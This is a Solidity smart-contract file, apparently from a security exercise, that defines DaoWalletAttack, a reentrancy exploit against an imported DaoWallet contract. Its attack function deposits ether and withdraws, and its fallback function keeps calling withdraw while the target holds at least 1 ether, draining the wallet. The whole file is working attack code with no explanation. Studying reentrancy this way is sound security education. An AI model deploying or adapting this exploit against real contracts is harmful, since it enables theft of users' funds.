pragma solidity ^0.8.0;

import "./DaoWallet.sol";

contract DaoWalletAttack {
    DaoWallet public daoWallet;

    constructor(address _daoWalletAddress) public {
        daoWallet = DaoWallet(_daoWalletAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        daoWallet.deposit{value: msg.value}();
        daoWallet.withdraw(1 ether);
    }

    fallback() external payable {
        if(address(daoWallet).balance >= 1 ether) {
            daoWallet.withdraw(1 ether);
        }
    }

    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
